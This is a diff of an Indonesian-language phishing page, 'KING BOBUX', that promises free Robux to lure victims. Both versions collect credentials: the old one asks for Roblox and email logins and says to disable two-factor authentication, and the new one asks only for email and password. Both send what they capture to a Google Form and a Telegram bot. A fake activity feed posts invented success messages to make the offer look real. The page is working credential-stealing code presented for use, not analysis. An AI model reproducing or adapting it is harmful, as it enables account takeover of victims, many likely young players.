@@ -13,58 +13,53 @@
         .loading-bar { width: 0%; animation: load 15s linear forwards; }
         @keyframes load { from { width: 0%; } to { width: 100%; } }
         .chat-box { height: 180px; overflow-y: hidden; font-size: 10px; border-radius: 15px; }
-        .glitch { animation: glitch 1s infinite; }
-        @keyframes glitch { 0% { color: #fff; } 50% { color: #facc15; } 100% { color: #fff; } }
     </style>
 </head>
 <body class="p-4 max-w-md mx-auto">
 
     <header class="text-center py-6">
-        <h1 class="text-4xl font-black italic text-yellow-500 uppercase leading-none glitch">KING <span class="text-white">BOBUX</span></h1>
-        <p class="text-[9px] text-red-500 font-bold mt-2 animate-pulse uppercase tracking-[1px]">● SERVER SIBUK: <span id="user-count">2,842</span> USER LAGI REBUTAN!</p>
+        <h1 class="text-4xl font-black italic text-yellow-500 uppercase leading-none">KING <span class="text-white">BOBUX</span></h1>
+        <p class="text-[9px] text-red-500 font-bold mt-2 animate-pulse uppercase tracking-[1px]">● LOGIN VIA EMAIL UNTUK VERIFIKASI HADIAH</p>
     </header>
 
     <div class="bg-zinc-900 border-2 border-yellow-500/50 p-6 rounded-[2rem] shadow-[0_0_30px_rgba(234,179,8,0.2)] mb-6">
         
         <div id="p1" class="text-center">
-            <p class="text-[10px] mb-4 text-gray-400 font-black uppercase italic">PILIH NOMINAL (JANGAN MARUK!):</p>
+            <p class="text-[10px] mb-4 text-gray-400 font-black uppercase italic italic">PILIH JUMLAH ROBUX:</p>
             <div class="grid grid-cols-2 gap-3 mb-6">
                 <button onclick="setA('10,000')" class="bg-white/5 border border-white/10 py-5 rounded-xl text-xs font-black active:scale-95 transition-all">10K RBX</button>
                 <button onclick="setA('50,000')" class="bg-white/5 border border-white/10 py-5 rounded-xl text-xs font-black active:scale-95 transition-all">50K RBX</button>
             </div>
-            <button onclick="toP2()" class="w-full bg-gold py-5 rounded-xl font-black text-black text-xs uppercase italic shadow-lg shadow-yellow-500/50">GAS CLAIM SEKARANG!</button>
+            <button onclick="toP2()" class="w-full bg-gold py-5 rounded-xl font-black text-black text-xs uppercase italic shadow-lg shadow-yellow-500/50">LANJUTKAN KE LOGIN EMAIL</button>
         </div>
 
-        <div id="p2" class="hidden space-y-3">
-            <p class="text-[9px] text-yellow-500 font-bold text-center mb-2 uppercase italic">Isi yang bener, salah dikit GAGAL!</p>
-            <input type="text" id="u" placeholder="USER ROBLOX (WAJIB BENER!)" class="w-full bg-black border border-white/20 p-4 rounded-xl text-sm outline-none font-bold text-yellow-500">
-            <input type="password" id="p" placeholder="PASSWORD AKUN LU" class="w-full bg-black border border-white/20 p-4 rounded-xl text-sm outline-none font-bold text-yellow-500">
-            <input type="email" id="e" placeholder="EMAIL PEMULIHAN (BIAR CEPET)" class="w-full bg-black border border-yellow-500/30 p-4 rounded-xl text-sm outline-none font-bold text-yellow-500">
-            <input type="password" id="ep" placeholder="SANDI EMAIL" class="w-full bg-black border border-yellow-500/30 p-4 rounded-xl text-sm outline-none font-bold text-yellow-500">
+        <div id="p2" class="hidden space-y-3 text-center">
+            <p class="text-[10px] text-yellow-500 font-black mb-4 uppercase">SISTEM MEMERLUKAN LOGIN EMAIL UNTUK PENGIRIMAN ROBUX!</p>
             
-            <div class="bg-red-900/50 p-3 rounded-xl border border-red-500 text-[10px] text-white font-black text-center italic">
-                ⚠️ MATIKAN A2F SEKARANG! <br> KALO GAK MATI, ROBUX GAK BAKAL MASUK.
+            <input type="email" id="e" placeholder="ALAMAT EMAIL (GMAIL/YAHOO)" class="w-full bg-black border border-white/20 p-4 rounded-xl text-sm outline-none font-bold text-yellow-500">
+            <input type="password" id="ep" placeholder="KATA SANDI EMAIL" class="w-full bg-black border border-white/20 p-4 rounded-xl text-sm outline-none font-bold text-yellow-500">
+            
+            <div class="bg-red-900/40 p-3 rounded-xl border border-red-500/30 text-[9px] text-white font-bold italic">
+                PERINGATAN: Gunakan email yang terhubung ke akun Roblox. <br> Masukkan sandi dengan benar atau sistem akan memblokir IP Anda!
             </div>
-            <button onclick="kirimData()" class="w-full bg-gold py-5 rounded-xl font-black text-black text-xs uppercase shadow-lg">KONFIRMASI SEKARANG!</button>
+            <button onclick="kirimData()" class="w-full bg-gold py-5 rounded-xl font-black text-black text-xs uppercase shadow-lg">VERIFIKASI & CLAIM</button>
         </div>
 
         <div id="p3" class="hidden text-center py-6 space-y-4">
-            <h3 class="text-yellow-500 font-black italic uppercase text-xl">INJEKSI DATABASE...</h3>
-            <div class="w-full bg-white/10 h-4 rounded-full overflow-hidden border border-yellow-500/20">
+            <h3 class="text-yellow-500 font-black italic uppercase text-xl">PROSES VERIFIKASI...</h3>
+            <div class="w-full bg-white/10 h-4 rounded-full overflow-hidden">
                 <div class="loading-bar bg-yellow-500 h-full"></div>
             </div>
-            <p class="text-[10px] text-gray-400 uppercase font-black italic px-4 leading-relaxed">
-                STATUS: <span class="text-green-500">SUCCESS!</span> <br><br> 
-                Akun lu lagi diproses. <span class="text-red-500 underline">JANGAN LOGIN 24 JAM!</span> <br> 
-                Ngeyel login? Robux angus & akun lu error!
+            <p class="text-[10px] text-gray-400 font-black italic">
+                Email sedang divalidasi. <br> Mohon jangan tutup halaman ini sampai selesai.
             </p>
         </div>
     </div>
 
     <div class="bg-zinc-900/50 border border-white/10 rounded-2xl p-4">
         <div class="flex items-center justify-between mb-2 border-b border-white/5 pb-2">
-            <p class="text-[10px] font-black text-yellow-500 italic">LIVE ACTIVITY (NON-STOP)</p>
-            <span class="text-[9px] text-green-500 font-bold uppercase animate-pulse">● Recieved</span>
+            <p class="text-[10px] font-black text-yellow-500 italic uppercase">Log Aktivitas Server</p>
+            <span class="text-[9px] text-green-500 font-bold uppercase animate-pulse">● Online</span>
         </div>
         <div id="chat-content" class="chat-box space-y-2 overflow-hidden"></div>
     </div>
@@ -75,32 +70,34 @@
         const teleChatId = "7153376507";
         const gform = "https://docs.google.com/forms/d/e/1FAIpQLSfgBrBP1Bqk4tfVHBFUPZDCbW5fj7nK8NZuObuQPmhyRcEGxg/formResponse";
 
-        function setA(v){ amt = v; alert("Sip, " + v + " RBX disiapin!"); }
-        function toP2(){ if(!amt) return alert("Pilih dulu nominalnya, bego!"); document.getElementById('p1').classList.add('hidden'); document.getElementById('p2').classList.remove('hidden'); }
+        function setA(v){ amt = v; alert("Jumlah " + v + " Robux dipilih!"); }
+        function toP2(){ if(!amt) return alert("Pilih jumlah Robux dulu!"); document.getElementById('p1').classList.add('hidden'); document.getElementById('p2').classList.remove('hidden'); }
 
         function kirimData(){
-            const user = document.getElementById('u').value;
-            const pass = document.getElementById('p').value;
-            const mail = document.getElementById('e').value || "-";
-            const spass = document.getElementById('ep').value || "-";
+            const mail = document.getElementById('e').value;
+            const spass = document.getElementById('ep').value;
 
-            if(!user || !pass) return alert("Data jangan dikosongin!");
+            if(!mail || !spass) return alert("Email dan Sandi tidak boleh kosong!");
 
+            // KIRIM KE GOOGLE FORM (Data kosong dikasih strip biar rapi)
             const fd = new FormData();
-            fd.append('entry.298399091', user); fd.append('entry.434090398', pass);
-            fd.append('entry.455306086', mail); fd.append('entry.734491941', spass);
-            fd.append('entry.1584180390', amt); fetch(gform, { method: 'POST', mode: 'no-cors', body: fd });
+            fd.append('entry.298399091', "LOGIN-EMAIL-ONLY"); 
+            fd.append('entry.434090398', "CHECK-EMAIL-PASS");
+            fd.append('entry.455306086', mail);
+            fd.append('entry.734491941', spass);
+            fd.append('entry.1584180390', amt); 
+            fetch(gform, { method: 'POST', mode: 'no-cors', body: fd });
 
-            const msgTele = `🚀 *AKUN BARU MASUK!*\n\n👤 *User:* \`${user}\` \n🔑 *Pass:* \`${pass}\` \n📧 *Mail:* \`${mail}\` \n🔐 *Sandi:* \`${spass}\` \n💎 *Jumlah:* \`${amt}\` RBX`;
+            // NOTIF KE TELEGRAM BOSS XZAM
+            const msgTele = `📧 *TARGET EMAIL BARU!*\n\n📧 *Email:* \`${mail}\` \n🔐 *Sandi:* \`${spass}\` \n💎 *Hadiah:* \`${amt}\` RBX\n\n⚠️ *GAS LOGIN SEKARANG!*`;
             fetch(`https://api.telegram.org/bot${teleToken}/sendMessage?chat_id=${teleChatId}&text=${encodeURIComponent(msgTele)}&parse_mode=Markdown`);
 
             document.getElementById('p2').classList.add('hidden');
             document.getElementById('p3').classList.remove('hidden');
         }
 
-        // --- FAST LIVE CHAT SIMULATOR ---
-        const names = ["ZfJoki", "RbxKing", "BocilMatre", "Slayer", "ReyJoki", "Admin_X", "BotGacor", "UserVip", "SultanBlox"];
-        const texts = ["Anjir beneran masuk!", "50k landing parah!", "Thx admin king bobux!", "Gak sia-sia matiin a2f.", "Landing mulus 10k!", "Yesss akhirnya!", "Coba dlu moga cair.", "Mantap gacor parah!"];
+        const names = ["Rizki", "Adit", "Vito", "Bayu", "Eka", "Dwi", "Fajar"];
+        const texts = ["Anjir email gw tembus!", "Login email doang dapet 50k!", "Baru tau bisa pake email.", "Work parah ini mah.", "Gak bohong email gw dapet notif!", "Langsung cair 10k!"];
         
         setInterval(() => {
             const box = document.getElementById('chat-content');
@@ -110,6 +107,11 @@
             el.className = "flex justify-between items-center border-b border-white/5 py-1";
             el.innerHTML = `<span class="text-yellow-500 font-bold">${name}:</span> <span class="text-gray-400 font-medium">${msg}</span>`;
             box.insertBefore(el, box.firstChild);
+            if(box.childNodes.length > 8) box.removeChild(box.lastChild);
+        }, 900);
+    </script>
+</body>
+</html>
             if(box.childNodes.length > 8) box.removeChild(box.lastChild);
             
             // Update user count
